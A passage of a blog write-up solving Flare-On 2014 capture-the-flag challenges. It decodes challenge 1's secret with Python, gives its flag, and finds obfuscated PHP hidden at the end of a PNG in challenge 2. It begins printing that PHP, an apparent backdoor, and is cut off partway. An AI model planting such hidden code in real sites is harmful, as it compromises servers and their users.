&lt;p&gt;Line 4 reads &lt;code&gt;dat_secret&lt;/code&gt; and the rest of the function manipulates it before displaying it on the form. To save this file expand &lt;code&gt;resources&lt;/code&gt; and select &lt;code&gt;rev_challenge_1.dat_secret.encode&lt;/code&gt;. Right click and select &lt;code&gt;Save Resource to File.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/1-4.jpg&#34; alt=&#34;Saving private secret&#34; title=&#34;Saving private secret&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I used &lt;code&gt;HxD&lt;/code&gt; to look at the contents.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Contents of dat_secret&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;A1 B5 &lt;span style=&#34;color: #2AA198&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt; E4 A1 B5 D4 &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt; B4 &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt; B4 &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt; D4 &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt; E4 C4 &lt;span style=&#34;color: #2AA198&#34;&gt;96&lt;/span&gt; F4 &lt;span style=&#34;color: #2AA198&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt; B5 C4 &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt; A4 &lt;span style=&#34;color: #2AA198&#34;&gt;64&lt;/span&gt; 44
¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s run the code with &lt;code&gt;dat_secret&lt;/code&gt; and print the result after each level (i.e. &lt;code&gt;str2, str3 and str4&lt;/code&gt;). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using &lt;a href=&#34;http://repl.it/languages&#34; target=&#34;_blank&#34;&gt;repl.it&lt;/a&gt;. Str1 is the answer so we don&amp;rsquo;t care about the rest:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Decoding dat_secret&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;binascii&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;datsecret&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;datsecret:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ord&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(item)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt;  &lt;span style=&#34;color: #B58900&#34;&gt;chr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;240&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h4 id=&#34;level-1-flag-3rmahg3rd-b0b-d0ge-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 1 flag: 3rmahg3rd.b0b.d0ge@flare-on.com&lt;/h4&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch2-a-challenge-2-a-study-in-javascript:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch2&#34;&gt;&lt;/a&gt; Challenge 2 - A Study in JavaScript&lt;/h2&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Well done! Looks like you kicked that one. I&amp;#39;ve attached the next challenge for your reversing pleasure. The password to this zip archive is &amp;quot;malware&amp;quot;.
We saw what looked like attacker activity to this site, can you figure out what the attackers changed?
Hopefully you&amp;#39;ll knock this one out too, Good luck!

-FLARE
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Inside the archive seems to be a copy of the original &lt;a href=&#34;http://flare-on.com&#34; target=&#34;_blank&#34;&gt;http://flare-on.com&lt;/a&gt; with a launch date countdown timer. I will be calling the html page from the website &lt;code&gt;original_html&lt;/code&gt; and the one in the zip file &lt;code&gt;challenge_html&lt;/code&gt;.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Contents of challenge zip file&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;8378&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;home.html&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;directory&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;called&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;img&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;one&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;single&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;png&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;9560&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;flare-on.png&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/2-1.jpg&#34; alt=&#34;challenge_html&#34; title=&#34;challenge_html&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The original web page looks a bit different.



    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Original web page&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;6254&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FLARE&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;On&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Challenge.htm&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;and&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;116290&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;bootstrap.css&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt;   &lt;span style=&#34;color: #93A1A1&#34;&gt;6596&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;flare-on-V2.png&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/2-2.jpg&#34; alt=&#34;original_html&#34; title=&#34;original_html&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The timer threw me off track. Is it really a countdown timer? When does it reach zero?&lt;br /&gt;
I changed the time in my VM to mess with it but it synced up with host.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;To de-sync guest and host time/date&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# vboxmanage is in the VirtualBox installation directory&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# So on Windows: C:\Program Files\Oracle\VirtualBox&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;vboxmanage&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;setextradata&lt;/span&gt; &lt;span style=&#34;color: #CB4B16&#34;&gt;[VMname]&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Changing the time did not mess with anything.&lt;/p&gt;

&lt;p&gt;We can diff the htmls or use Notepad++&amp;rsquo;s &lt;a href=&#34;http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/&#34; target=&#34;_blank&#34;&gt;compare&lt;/a&gt; plugin.
Most differences are aesthetic. There are two interesting differences. In line 54, &lt;code&gt;original_html&lt;/code&gt; has &lt;code&gt;&amp;lt;img src=&amp;quot;The%20FLARE%20On%20Challenge_files/flare-on-V2.png&amp;quot;&amp;gt;&lt;/code&gt; while &lt;code&gt;challenge_html&lt;/code&gt; includes &lt;code&gt;&amp;lt;img src=&amp;quot;img/flare-on.png&amp;quot;&amp;gt;&lt;/code&gt;. So the file in the website is version 2 of the image. Later in the &lt;code&gt;challenge_html&lt;/code&gt; we see more evidence of this image file &lt;code&gt;&amp;lt;?php include &amp;quot;img/flare-on-V3.png&amp;quot; ?&amp;gt;&lt;/code&gt;. But wait a minute, the filesize of these images were different:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Different sizes&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;9560&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Jul&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;21:30&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;flare-on.png&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;-rwx------+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TyRaX&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;None&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;6596&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Dec&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;18&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;2013&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;flare-on-V2.png&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;The challenge png is bigger. I used &lt;code&gt;HxD&lt;/code&gt; to compare these two files (as they are not text) and at the end of &lt;code&gt;flare-on.png&lt;/code&gt; I saw some PHP code. To be honest I was thinking of steganography or some &lt;a href=&#34;https://twitter.com/angealbertini&#34; target=&#34;_blank&#34;&gt;Ange Albertini magic&lt;/a&gt;. But that would have been too hard for level 2. Here is the PHP code (beautified):&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Code inside png&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;?php&lt;/span&gt; 
&lt;span style=&#34;color: #268BD2&#34;&gt;$terms&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=array&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;M&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Z&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;]&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;f&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;v&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Q&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;+&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;E&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;D&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;g&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;W&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;q&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;y&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;T&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;V&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;X&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;)&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;9&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;P&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;\&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;G&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;~&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;O&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;u&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;U&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;@&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;H&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: 